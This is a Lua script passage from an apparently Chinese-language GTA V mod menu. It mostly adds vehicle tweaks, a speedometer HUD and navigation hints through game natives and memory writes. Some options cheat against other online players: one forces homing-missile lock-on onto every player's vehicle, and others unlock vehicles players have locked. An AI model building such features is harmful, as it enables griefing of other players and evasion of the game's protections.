function update_attachment_position(attachment)
    if attachment.offset == nil then
        attachment.offset = {x=0,y=0,z=0}
    end
    if attachment.rotation == nil then
        attachment.rotation = {x=0,y=0,z=0}
    end
    if attachment.collision == nil then
        attachment.collision = true
    end
    ENTITY.ATTACH_ENTITY_TO_ENTITY(
        attachment.handle, attachment.root, attachment.bone_index or 0,
        attachment.offset.x or 0, attachment.offset.y or 0, attachment.offset.z or 0,
        attachment.rotation.x or 0, attachment.rotation.y or 0, attachment.rotation.z or 0,
        false, true, attachment.collision, false, 2, true
    )
end

function attach(attachment)
    attachment.position = ENTITY.GET_ENTITY_COORDS(attachment.root)
    ENTITY.SET_ENTITY_HAS_GRAVITY(attachment.handle, false)
    set_attachment_offset_for_root(attachment)
    update_attachment_position(attachment)

    ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(attachment.root, attachment.handle)

    return attachment
end

function detach_attached_vehicle()
    if state.attached_vehicle ~= nil then
        util.toast("已分离")
        ENTITY.DETACH_ENTITY(state.attached_vehicle.handle, true, true)
        state.attached_vehicle = nil
    end
end

function attach_nearest_vehicle()
    local player_vehicle = entities.get_user_vehicle_as_handle()
    if not player_vehicle then
        util.toast("你必须在一辆车里")
        return
    end
    local pos = ENTITY.GET_ENTITY_COORDS(player_vehicle, 1)
    local range = 10
    local nearby_vehicles = entities.get_all_vehicles_as_handles()
    local count = 0
    for _, vehicle_handle in ipairs(nearby_vehicles) do
        if vehicle_handle ~= player_vehicle then
            local attachment = {handle=vehicle_handle, root=player_vehicle}
            attachment.position = ENTITY.GET_ENTITY_COORDS(attachment.handle, 1)
            attachment.distance = SYSTEM.VDIST(pos.x, pos.y, pos.z, attachment.position.x, attachment.position.y, attachment.position.z)
            if attachment.distance <= range then
                detach_attached_vehicle()
                attachment.name = VEHICLE.GET_DISPLAY_NAME_FROM_VEHICLE_MODEL(ENTITY.GET_ENTITY_MODEL(attachment.handle))
                util.toast("连接 "..attachment.name)
                attach(attachment)
                state.attached_vehicle = attachment
                return
            end
        end
    end
end

tuochea = menu.list(funfeatures_veh, "拖车", {}, "", function();end)

menu.action(tuochea, "MTL 拓荒者", {}, "生产一辆MTL 拓荒者", function()
    menu.trigger_commands("wastelander")
end)
menu.action(tuochea, "威皮 大满贯卡车", {}, "生成一辆威皮 大满贯卡车", function()
    menu.trigger_commands("slamtruck")
end)

menu.action(tuochea, "连接", {}, "任何接近的车辆都将连接到您当前的车辆", function()
    attach_nearest_vehicle()
end)

menu.action(tuochea, "分离", {}, "", function()
    detach_attached_vehicle()
end)

aircrafthud = menu.list(funfeatures_veh, "飞机信息显示", {}, "", function();end)

feijihud = menu.action(aircrafthud,"加载flightredux",{"loadflightredux"},"",function()
    notification("正在加载飞机信息显示请稍等")
    util.yield(1500)
    require("lib/GTlib/flightredux")
    menu.delete(feijihud)
end)

dow_block = 0
driveonwater = false
local ls_driveonwater = menu.toggle(funfeatures_veh, "水上驾驶", {"driveonwater"}, "", function(on)
    driveonwater = on
    if on then
        if driveonair then
            menu.set_value(ls_driveonair, false)
            notification("“空中驾驶”已自动关闭,以防止出现问题。", colors.blue)
        end
    else
        if not driveonair and not walkonwater then
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dow_block, 0, 0, 0, false, false, false)
        end
    end
end)

doa_ht = 0
driveonair = false
ls_driveonair = menu.toggle(funfeatures_veh, "空中驾驶", {"driveonair"}, "", function(on)
    driveonair = on
    if on then
        local pos = players.get_position(players.user())
        doa_ht = pos['z']
        notification("使用空格键和ctrl键微调驾驶高度!", colors.blue)
        if driveonwater then
            menu.set_value(ls_driveonwater, false)
            notification("水上驾驶已自动关闭,以防止出现问题。", colors.blue)
        end
    end
end)

	menu.action(funfeatures_veh, '左侧翻', {}, '', function()
		local vehicle = get_vehicle_player_is_in(pId)
		if WIRI_ENTITY.DOES_ENTITY_EXIST(vehicle) and WIRI_VEHICLE.IS_VEHICLE_ON_ALL_WHEELS(vehicle) and
		request_control(vehicle, 1000) then
			WIRI_ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 10.71, 5.0, 0.0, 0.0, 1, false, true, true, true, true)
		end
	end)

	menu.action(funfeatures_veh, '右侧翻', {}, '', function()
		local vehicle = get_vehicle_player_is_in(pId)
		if WIRI_ENTITY.DOES_ENTITY_EXIST(vehicle) and WIRI_VEHICLE.IS_VEHICLE_ON_ALL_WHEELS(vehicle) and
		request_control(vehicle, 1000) then
			WIRI_ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 10.71, -5.0, 0.0, 0.0, 1, false, true, true, true, true)
		end
	end)

    menu.action(funfeatures_veh, '双左侧翻', {}, '', function()
		local vehicle = get_vehicle_player_is_in(pId)
		if WIRI_ENTITY.DOES_ENTITY_EXIST(vehicle) and WIRI_VEHICLE.IS_VEHICLE_ON_ALL_WHEELS(vehicle) and
		request_control(vehicle, 1000) then
			WIRI_ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 21.43, 20.0, 0.0, 0.0, 1, false, true, true, true, true)
		end
	end)

pwinmenu = menu.list(carfly, '车窗', {}, '')

menu.action(pwinmenu, '卷起所有窗口', {'upwin'}, '立即卷起所有窗口', function ()
        Rollaup(players.user())
end)

menu.action(pwinmenu, '滚下所有窗户', {'downwin'}, '立即卷起所有窗口', function ()
        Rolladown(players.user())
end)

winmen = menu.list(pwinmenu, '上下卷窗', {''}, '上下滚动单个窗口')
        
for index, name in ipairs(Windows) do
    menu.toggle(winmen, '向上或向下滚动 '..name, {''}, '向上或向下滚动 '..name, function (on)
        local win = index - 1
        local curcar = entities.get_user_vehicle_as_handle()
        local winup= on
        if winup ~= nil then
            if winup then
                VEHICLE.ROLL_DOWN_WINDOW(curcar, win)
            else
                VEHICLE.ROLL_UP_WINDOW(curcar, win)
            end
        end
    end)
end

menu.action(funfeatures_veh, "弹射起步", {}, "极速", function(on)
    boost_player_vehicle_forward(on)
end)

local nitro_duration = 5000
local nitro_power = 2000
menu.toggle_loop(funfeatures_veh, "氮气加速", {}, "按X使用", function(toggle)
    if WIRI_PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) and player_cur_car ~= 0 then
        if WIRI_PAD.IS_CONTROL_JUST_PRESSED(357, 357) then 
            request_ptfx_asset('veh_xs_vehicle_mods')
            VEHICLE.SET_OVERRIDE_NITROUS_LEVEL(player_cur_car, true, 100, nitro_power, 99999999999, false)
            ENTITY.SET_ENTITY_MAX_SPEED(player_cur_car, 2000)
            VEHICLE.SET_VEHICLE_MAX_SPEED(player_cur_car, 2000)
            util.yield(nitro_duration)
            VEHICLE.SET_OVERRIDE_NITROUS_LEVEL(player_cur_car, false, 0, 0, 0, false)
            VEHICLE.SET_VEHICLE_MAX_SPEED(player_cur_car, 0.0)
        end
    end
end)

menu.slider(funfeatures_veh, "氮气时间", {"nitroduration"}, "", 1, 30, 5, 1, function(val)
    nitro_duration = val * 1000
end)

menu.slider(funfeatures_veh, "氮气速度", {"nitropower"}, "", 1, 10000, 2000, 50, function(val)
    nitro_power = val
end)

cur_v_stance = 0.0
menu.click_slider_float(funfeatures_veh, "调整轮胎", {""}, "", 0, 25000, 0, 100, function(s)
    cur_v_stance = s * -0.001
    if player_cur_car ~= 0 then
        set_vehicle_handling_value(player_cur_car, 0xD0, cur_v_stance)
    end
end)

menu.toggle_loop(funfeatures_veh,  "喇叭加速", {}, "按E加速", function(toggle)
    if player_cur_car ~= 0 then
        VEHICLE.SET_VEHICLE_ALARM(player_cur_car, false)
        if AUDIO.IS_HORN_ACTIVE(player_cur_car) then
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(player_cur_car, 1, 0.0, 1.0, 0.0, true, true, true, true)
        end
    end
end)

menu.toggle_loop(funfeatures_veh, "载具平移", {}, "使用左右箭头键使车辆水平移动", function(toggle)
    if player_cur_car ~= 0 then
        local rot = ENTITY.GET_ENTITY_ROTATION(player_cur_car, 0)
        if PAD.IS_CONTROL_PRESSED(175, 175) then
            ENTITY.APPLY_FORCE_TO_ENTITY(player_cur_car, 1, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
            ENTITY.SET_ENTITY_ROTATION(player_cur_car, rot['x'], rot['y'], rot['z'], 0, true)
        end
        if PAD.IS_CONTROL_PRESSED(174, 174) then
            ENTITY.APPLY_FORCE_TO_ENTITY(player_cur_car, 1, -1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
            ENTITY.SET_ENTITY_ROTATION(player_cur_car, rot['x'], rot['y'], rot['z'], 0, true)
        end
    end
end)

menu.toggle_loop(funfeatures_veh, "发射轮船", {}, "按ctrl键和w键进行转盘操作.", function(toggled)
    local veh = entities.get_user_vehicle_as_handle()
    if veh == 0 then return end
    local CAutomobile = entities.handle_to_pointer(veh)
    local CHandlingData = memory.read_long(CAutomobile + 0x0918)
    if util.is_key_down(0x57) and util.is_key_down(0x11) then 
       memory.write_float(CHandlingData + 0x00EC, -0.25)
    else
       memory.write_float(CHandlingData + 0x00EC, 0.5)
    end
end)

menu.toggle_loop(funfeatures_veh, "绕过防锁定", {}, "绕过锁定限制.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            VEHICLE.SET_VEHICLE_ALLOW_HOMING_MISSLE_LOCKON_SYNCED(veh, true)
        end
    end
end)

local veh_jump = menu.list(funfeatures_veh, "车辆跳跃")
local force = 25.00
menu.slider_float(veh_jump, "跳跃倍率", {"jumpiness"}, "", 0, 10000, 2500, 100, function(value)
    force = value / 100
end)
menu.toggle_loop(veh_jump, "启动", {"vehiclejump"}, "按空格键跳跃.", function()
    local veh = entities.get_user_vehicle_as_handle()
    if veh ~= 0 and ENTITY.DOES_ENTITY_EXIST(veh) and PAD.IS_CONTROL_JUST_RELEASED(0, 102) then
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, force/1.5, force, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        repeat
            util.yield()
        until not ENTITY.IS_ENTITY_IN_AIR(veh)
    end
end)
vslamforce = 20
menu.toggle_loop(funfeatures_veh, "车辆下降", {"vslamforce"}, "按ctrl", function(toggle)
    if player_cur_car ~= 0 then
        if PAD.IS_CONTROL_JUST_PRESSED(36,36) then
            ENTITY.APPLY_FORCE_TO_ENTITY(player_cur_car, 1, 0.0, 0.0, -vslamforce, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
        end
    end
end)

menu.toggle_loop(funfeatures_veh, "转向灯", {}, "AD键", function()
    if(PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false)) then
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
        local left = PAD.IS_CONTROL_PRESSED(34, 34)
        local right = PAD.IS_CONTROL_PRESSED(35, 35)
        local rear = PAD.IS_CONTROL_PRESSED(130, 130)
        if left and not right and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
        elseif right and not left and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        elseif rear and not left and not right then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        else
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, false)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, false)
        end
    end
end)

menu.toggle(funfeatures_veh, "车辆变形", {}, "载具不能是无敌的\n关闭载具修复功能", function(toggled)
    if toggled then
        menu.trigger_commands("vhdeformationmult 10000.0")
    else
        menu.trigger_commands("vhdeformationmult 1.00")
    end
end)

local seat_id = -1
local moved_seat = menu.click_slider(funfeatures_veh, "更换车辆座位", {}, "", 1, 1, 1, 1, function(seat_id)
    TASK.TASK_WARP_PED_INTO_VEHICLE(players.user_ped(), entities.get_user_vehicle_as_handle(), seat_id - 2)
end)

menu.on_tick_in_viewport(moved_seat, function()
    if not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
        moved_seat.max_value = 0
    return end

    if not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
        moved_seat.max_value = 0
    return end
    
    moved_seat.max_value = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(ENTITY.GET_ENTITY_MODEL(entities.get_user_vehicle_as_handle()))
end)

menu.toggle_loop(funfeatures_veh, "贴地/贴墙", {}, "让你的车停在地上,也能让你粘在墙上。", function(on)
    if player_cur_car ~= 0 then
        local vel = ENTITY.GET_ENTITY_VELOCITY(player_cur_car)
        vel['z'] = -vel['z']
        ENTITY.APPLY_FORCE_TO_ENTITY(player_cur_car, 2, 0, 0, -50 -vel['z'], 0, 0, 0, 0, true, false, true, false, true)
    end
end)

menu.action(funfeatures_veh, "车辆反转", {}, "在保持动力的情况下转弯。建议对此进行绑定。", function(click_type)
    if player_cur_car ~= 0 then
        local rot = ENTITY.GET_ENTITY_ROTATION(player_cur_car, 0)
        local vel = ENTITY.GET_ENTITY_VELOCITY(player_cur_car)
        ENTITY.SET_ENTITY_ROTATION(player_cur_car, rot['x'], rot['y'], rot['z']+180, 0, true)
        ENTITY.SET_ENTITY_VELOCITY(player_cur_car, -vel['x'], -vel['y'], vel['z'])
    end
end)

menu.toggle_loop(funfeatures_veh, "显示车辆角度", {"carangle"}, "", function()
    if player_cur_car ~= 0 and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
        local ang = math.abs(math.ceil(math.abs(ENTITY.GET_ENTITY_ROTATION(player_cur_car, 0).z) - math.abs(CAM.GET_GAMEPLAY_CAM_ROT(0).z)))
        directx.draw_text(0.5, 1.0, tostring(ang) .. '°', 5, 1.4, {r=1, g=1, b=1, a=1}, true)
    end
end)

manual_transmission_list = menu.list(funfeatures_veh, "手动加减档", {}, "" )
manual_mode = false 
menu.toggle(manual_transmission_list, "手动模式开启", {}, "", function(on)
    manual_mode = on
    while true do 
        if player_cur_car ~= 0 then 
            local addr = entities.get_user_vehicle_as_pointer()
            local cur_gear = entities.get_current_gear(addr)
            local next_gear = entities.get_next_gear(addr)
            if not manual_mode then 
                entities.set_next_gear(addr, next_gear)
                break 
            end
            if m_shift_up_this_frame then
                if cur_gear ~= 6 then
                    entities.set_next_gear(addr, cur_gear + 1)
                end
                m_shift_up_this_frame = false 
            elseif m_shift_down_this_frame then 
                if cur_gear > 1 then 
                    entities.set_next_gear(addr, cur_gear - 1)
                end
                m_shift_down_this_frame = false 
            else
                entities.set_next_gear(addr, cur_gear)
            end
        end
        util.yield()
    end
end)

menu.action(manual_transmission_list, "下一档", {}, "", function()
    if player_cur_car ~= 0 then 
        m_shift_up_this_frame = true 
    end
end)

menu.action(manual_transmission_list, "上一档", {}, "", function()
    if player_cur_car ~= 0 then 
        m_shift_down_this_frame = true 
    end
end)

local resources_dir = filesystem.scripts_dir() .. '\\GTScript\\'.. '\\chesubiao\\'
needle = directx.create_texture(resources_dir .. 'needle.png')
speedometer_case = directx.create_texture(resources_dir .. 'speedometer_case.png')
check_engine_light = directx.create_texture(resources_dir .. 'check_engine.png')
tach_case = directx.create_texture(resources_dir .. 'tach_case.png')
high_beam = directx.create_texture(resources_dir .. 'highbeam.png')
low_beam = directx.create_texture(resources_dir .. 'lowbeam.png')
tpms = directx.create_texture(resources_dir .. 'tpms.png')
traction_control = directx.create_texture(resources_dir .. 'traction.png')

icluster = menu.list(funfeatures_veh, "车速表", {}, "", function();end)

unit = 1
menu.list_select(icluster, "单位", {"iclusterunits"}, "", {"MPH", "KPH"}, 1, function(index)
    unit = index 
end)

speedometer_x_pos = 0.700
menu.slider_float(icluster, "车速表位置X", {}, "", 0, 1000, 700, 1, function(s)
    speedometer_x_pos = s * 0.001
end)

speedometer_y_pos = 0.800
menu.slider_float(icluster, "车速表位置Y", {}, "", 0, 1000, 800, 1, function(s)
    speedometer_y_pos = s * 0.001
end)


tachometer_x_pos = 0.830
menu.slider_float(icluster, "转速表位置X", {}, "", 0, 1000, 830, 1, function(s)
    tachometer_x_pos = s * 0.001
end)

tachometer_y_pos = 0.818
menu.slider_float(icluster, "转速表位置Y", {}, "", 0, 1000, 818, 1, function(s)
    tachometer_y_pos = s * 0.001
end)

gear_x_pos = 0.764
menu.slider_float(icluster, "齿轮位置X", {}, "", 0, 1000, 764, 1, function(s)
    gear_x_pos = s * 0.001
end)

gear_y_pos = 0.870
menu.slider_float(icluster, "齿轮位置Y", {}, "", 0, 1000, 870, 1, function(s)
    gear_y_pos = s * 0.001
end)

lights_x_pos = 0.660
menu.slider_float(icluster, "仪器位置X", {}, "", 0, 1000, 660, 1, function(s)
    lights_x_pos = s * 0.001
end)

lights_y_pos = 0.920
menu.slider_float(icluster, "仪器位置Y", {}, "", 0, 1000, 920, 1, function(s)
    lights_y_pos = s * 0.001
end)

white = {
    r = 1,
    g = 1,
    b = 1,
    a = 1.0
}

orange = {
    r = 1.0,
    g = 0.5,
    b = 0,
    a = 1
}

blue = {
    r = 0, 
    g = 0, 
    b = 1, 
    a = 1
}

green = {
    r = 0, 
    g = 1, 
    b = 0, 
    a = 1
}
menu.toggle(icluster, "车速表显示", {"icluster"}, "", function(state)
    UItoggle = state
local lights, high_lights = memory.alloc_int(), memory.alloc_int()
while UItoggle do 
    vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
    if vehicle ~= 0 and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then 
        local vecs = ENTITY.GET_ENTITY_SPEED_VECTOR(vehicle, true)
        local v_hdl = entities.handle_to_pointer(vehicle)
        local speed = ENTITY.GET_ENTITY_SPEED(vehicle)
        local mph = speed * 2.236936
        local kph = speed * 3.6
        local max = VEHICLE.GET_VEHICLE_ESTIMATED_MAX_SPEED(vehicle)
        local max_mph = max * 2.236936
        local max_kph = max * 3.6

        if unit == 1 then 
            measured_speed = mph 
            measured_max = max_mph
        else
            measured_speed = kph 
            measured_max = max_kph
        end
        local speed_rotation = (measured_speed/measured_max)*0.32
        if speed_rotation >= 0.75 then 
            speed_rotation = 0.75
        end
        local rpm = entities.get_rpm(v_hdl)
        if rpm == 1 then 
            -- rev limiter simulation
            rpm = rpm + math.random(-2, 2)*0.01
        end
        local tach_rotation = rpm*0.45
        directx.draw_texture(speedometer_case, 0.05, 0.05, 0.5, 0.5, speedometer_x_pos, speedometer_y_pos, 0, white)
        directx.draw_texture(needle, 0.023, 0.023, 0.88, 0.125, speedometer_x_pos, speedometer_y_pos+0.015, speed_rotation, white)
        -- speed text also i guess what
        directx.draw_text(speedometer_x_pos, speedometer_y_pos+0.065, math.ceil(measured_speed), 5, 0.8, white, true)
        -- rpm gauge
        directx.draw_texture(tach_case, 0.05, 0.05, 0.5, 0.5, tachometer_x_pos, tachometer_y_pos-0.015, 0, white)
        -- rpm needle
        directx.draw_texture(needle, 0.023, 0.023, 0.88, 0.125, tachometer_x_pos, tachometer_y_pos, tach_rotation, white)
        -- rpm text
        directx.draw_text(tachometer_x_pos, tachometer_y_pos+0.05, math.ceil(rpm*6000), 5, 0.8, white, true)
        -- gear text 
        gear = entities.get_current_gear(v_hdl)
        if gear == 0 and vecs.y < 0 then
            gear = "R"
        end
        if VEHICLE.GET_VEHICLE_ENGINE_HEALTH(vehicle) < 1000 then
            directx.draw_texture(check_engine_light, 0.01, 0.01, 0.5, 0.5, lights_x_pos, lights_y_pos, 0, orange)
        end
        VEHICLE.GET_VEHICLE_LIGHTS_STATE(vehicle, lights, high_lights)
        if memory.read_byte(lights) == 1 then 
            if memory.read_byte(high_lights) == 1 then 
                directx.draw_texture(high_beam, 0.01, 0.01, 0.5, 0.5, lights_x_pos + 0.04, lights_y_pos, 0, blue)
            else
                directx.draw_texture(low_beam, 0.01, 0.01, 0.5, 0.5, lights_x_pos + 0.03, lights_y_pos, 0, green)
            end
        end
        any_tires_burst = false 
        for i = 1, 4 do 
            if VEHICLE.IS_VEHICLE_TYRE_BURST(vehicle, i, false) then 
                any_tires_burst = true 
            end
        end
        if any_tires_burst then 
            directx.draw_texture(tpms, 0.01, 0.01, 0.5, 0.5, lights_x_pos + 0.08, lights_y_pos, 0, orange)
        end

        directx.draw_text(gear_x_pos, gear_y_pos, gear, 5, 1.2, white, true)
        if VEHICLE.IS_VEHICLE_IN_BURNOUT(vehicle) or math.abs(vecs.x) > 3 then 
            directx.draw_texture(traction_control, 0.01, 0.01, 0.5, 0.5, lights_x_pos + 0.11, lights_y_pos, 0, orange)

        end
        
    end
    util.yield()
end
end)

menu.toggle_loop(funfeatures_veh, "按住shift键进行漂移", {"dshiftdrift"}, "你听到我说的了.", function(on)
    if PAD.IS_CONTROL_PRESSED(21, 21) then
        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true)
        VEHICLE.SET_VEHICLE_REDUCE_GRIP_LEVEL(player_cur_car, 0.0)
    else
        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, false)
    end
end)

local shift_drift_toggle = false 
menu.toggle(funfeatures_veh, "开关换挡(shift)漂移", {"shiftdrifttoggle"}, "您应该将热键绑定到此开关，否则此功能将变得有点无用", function(on)
    shift_drift_toggle = on
    while true do
        if player_cur_car ~= 0 then 
            if not shift_drift_toggle then 
                VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, false)
                break 
            end
            VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true)
            VEHICLE.SET_VEHICLE_REDUCE_GRIP_LEVEL(player_cur_car, 0.0)
        end
        util.yield()
    end
end)

menu.toggle(funfeatures_veh, "头文字D模式", {"initiald"}, "应用预定义的载具操纵配置,使您更容易漂移.这不会神奇地让你成为一名漂移高手,也不会神奇地使每辆车都擅长漂移.", function(on, click_type)
    initial_d_mode = on
    initial_d_score_thread()
    if player_cur_car ~= 0 then 
        if on then
            set_vehicle_into_drift_mode(player_cur_car)
        else
            for offset, value in pairs(last_vehicle_handling_data) do
                set_vehicle_handling_value(player_cur_car, offset, value)
            end
        end
    end
end)

menu.toggle_loop(funfeatures_veh,  "相机方向推力", {"thrustindir"}, "按住X并保持此状态,将载具推向摄相机所面对的方向。用于维持漂移状态。", function(on)
    if player_cur_car ~= 0 and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then 
        if util.is_key_down("X") then 
            cam_direction()
        else 
            before_vel = ENTITY.GET_ENTITY_VELOCITY(player_cur_car)
        end
    end
end)
menu.slider_float(funfeatures_veh, "相机方向推力的速度", {"thrustindiradd"}, "相机方向的推力需要增加多少额外速度", 0, 3000, 125, 1, function(s)
    thrust_cam_dir_add = s * -0.001
end)

menu.toggle_loop(carfly, translate("Vehicle", "引擎保持启动"), {"alwayson"}, "", function()
	if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
		local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
		VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
		VEHICLE.SET_VEHICLE_LIGHTS(vehicle, 0)
		VEHICLE.SET_VEHICLE_HEADLIGHT_SHADOWS(vehicle, 2)
	end
end)

local speedometer_plate_root = menu.list(carfly, "车速表板", {}, "将车牌文本设置为车辆的当前速度。")

mph_plate = false
menu.toggle(speedometer_plate_root, "车速表板", {}, "将车牌文本设置为车辆的当前速度。", function(on)
    mph_plate = on
    if on then
        if player_cur_car ~= 0 then
            original_plate = VEHICLE.GET_VEHICLE_NUMBER_PLATE_TEXT(player_cur_car)
        else
            notification("启动时您不在车内。您将无法还原车牌文本。")
            original_plate = "GT"
        end
    else
        if player_cur_car ~= 0 then
            if original_plate == nil then
                original_plate = "GT"
            end
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(player_cur_car, original_plate)
        end
    end
end)

menu.toggle_loop(carfly, "上车时自动打开电台", {"autotune"}, "上车后执行'tune'命令.", function()
    local localped = GetLocalPed()
    if PED.IS_PED_GETTING_INTO_A_VEHICLE(localped) then
        menu.trigger_commands("tune")
    end
end)

menu.action(carfly, "将载具上下颠倒", {}, "", function ()
    UpsideDownVehicleRotationWithKeys()
end)

local fastTurnVehicleScale = 3

menu.toggle_loop(carfly, "载具快速定制转弯", {}, "用A/D键快速转动载具.", function ()
    FastTurnVehicleWithKeys(fastTurnVehicleScale)
end)

menu.slider(carfly, "载具快速定制转弯强度", {"vehfastturn"}, "设置自定义转弯的比例.", 1, 1000, 30, 5, function(value)
    fastTurnVehicleScale = value / 10
end)

menu.toggle_loop(carfly, "解锁你射击的载具", {"unlockvehshot"}, "这将在锁定的玩家载具上起作用.", function ()
    UnlockVehicleShoot()
end)

menu.toggle_loop(carfly, "解锁你试图进入的载具", {"unlockvehget"}, "这将在锁定的玩家载具上起作用.", function ()
    UnlockVehicleGetIn()
end)

SuperVehMultiply = 1.2

BetterSuperDrive = false
menu.toggle(carfly, "速度更改 (锁定)", {"vehmultiply"}, "", function (superd)
    if superd then
        local localped = GetLocalPed()
        BetterSuperDrive = true
        util.create_thread(function()
            while BetterSuperDrive do
                if PED.IS_PED_IN_ANY_VEHICLE(localped, false) then
                    --if PAD.IS_CONTROL_PRESSED(0, 71) then --71 == INPUT_VEH_ACCELERATE
                        local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
                        local vehVel = ENTITY.GET_ENTITY_VELOCITY(veh)
                        local newVel = {x = vehVel.x * SuperVehMultiply, y = vehVel.y * SuperVehMultiply, z = vehVel.z * SuperVehMultiply}
                        ENTITY.SET_ENTITY_VELOCITY(veh, newVel.x, newVel.y, newVel.z)
                        wait(100)
                    --end
                end
                wait()
            end
            util.stop_thread()
        end)
    else
        BetterSuperDrive = false
    end
end)

menu.toggle(carfly, "速度更改 (绑定到LShift)", {"vehmultiplyshift"}, "", function (superd)
    if superd then
        local localped = GetLocalPed()
        BetterSuperDrive = true
        util.create_thread(function()
            while BetterSuperDrive do
                if PED.IS_PED_IN_ANY_VEHICLE(localped, false) then
                    if PAD.IS_CONTROL_PRESSED(0, 21) --[[or PAD.IS_CONTROL_PRESSED(0, 61)]] then --21 == INPUT_SPRINT || 61 == INPUT_VEH_MOVE_UP_ONLY
                        local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
                        local vehVel = ENTITY.GET_ENTITY_VELOCITY(veh)
                        local newVel = {x = vehVel.x * SuperVehMultiply, y = vehVel.y * SuperVehMultiply, z = vehVel.z * SuperVehMultiply}
                        ENTITY.SET_ENTITY_VELOCITY(veh, newVel.x, newVel.y, newVel.z)
                        wait(100)
                    end
                end
                wait()
            end
            util.stop_thread()
        end)
    else
        BetterSuperDrive = false
    end
end)

menu.slider(carfly, "速度调节 (/100)", {"vehmultnum"}, "除以 100.", 1, 1000, 120, 10, function(val)
    SuperVehMultiply = val/100
end)

menu.slider(carfly, "换座位", {""}, "", -1, 6, -1, 1, function(value)

        local ourped = PLAYER.PLAYER_PED_ID()

    if PED.IS_PED_IN_ANY_VEHICLE(ourped, false) then

        local veh = PED.GET_VEHICLE_PED_IS_IN(ourped, false)

        PED.SET_PED_INTO_VEHICLE(ourped, veh, value)

    else

        notification("进入载具才能生效")

    end

end)


local player_ped_id
local delta_time
local player_pos
util.create_tick_handler(function ()
    player_ped_id = PLAYER.PLAYER_PED_ID()
    delta_time = MISC.GET_FRAME_TIME()
    player_pos = ENTITY.GET_ENTITY_COORDS(player_ped_id)
    return true
end)


local math_funcs = b_math_funcs.new()
local shitty_gps_colour_a = {r = 255,g = 0,b = 255,a = 255}
local shitty_gps_colour_b = {r = 255,g = 255,b = 255,a = 255}
local shitty_gps_run = false
menu.toggle(carfly, "GPS导航", {"导航提示"}, "", function(value)

    local p_direction = memory.alloc(1) --bool
    local p_5 = memory.alloc(4) --float
    local p_distToNxJunction = memory.alloc(4) --float
    local p_screenX = memory.alloc(4) --float
    local p_screenY = memory.alloc(4) --float

    local turn_dir = 0
    shitty_gps_run = value

    if value then
    util.create_tick_handler(function ()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)

    local waypoint_pos = get_waypoint_coords()
    local total = waypoint_pos.x + waypoint_pos.y + waypoint_pos.z

    if total ~= 0 and ENTITY.IS_ENTITY_A_VEHICLE(vehicle) then
        local height = ENTITY.GET_ENTITY_HEIGHT(vehicle, player_pos.x, player_pos.y, player_pos.z, true, false)

        PATHFIND.GENERATE_DIRECTIONS_TO_COORD(
            waypoint_pos.x,
            waypoint_pos.y,
            waypoint_pos.z,
            0,
            p_direction,
            p_5,
            p_distToNxJunction
        )

        local direction = memory.read_byte(p_direction)
        local distToNxJunction = memory.read_float(p_distToNxJunction)



        GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(
            player_pos.x,
            player_pos.y,
            player_pos.z + 1.5 + height,
            p_screenX,
            p_screenY
        )
        local screen_x = memory.read_float(p_screenX)
        local screen_y = memory.read_float(p_screenY)

       if direction == 1 then
            turn_dir = math_funcs.lerp(turn_dir, 180, 5 * delta_time)
            directx.draw_text(screen_x, screen_y, "可以的话请调头", ALIGN_CENTRE, 1, shitty_gps_colour_a)
        elseif direction == 3 then
            turn_dir =  math_funcs.lerp(turn_dir, -90, 5 * delta_time)
            directx.draw_text(screen_x,screen_y,"左转 " .. math.floor(distToNxJunction) .. " 米",ALIGN_CENTRE,1,shitty_gps_colour_a)
        elseif direction == 6 then
            turn_dir =  math_funcs.lerp(turn_dir, -145, 5 * delta_time)
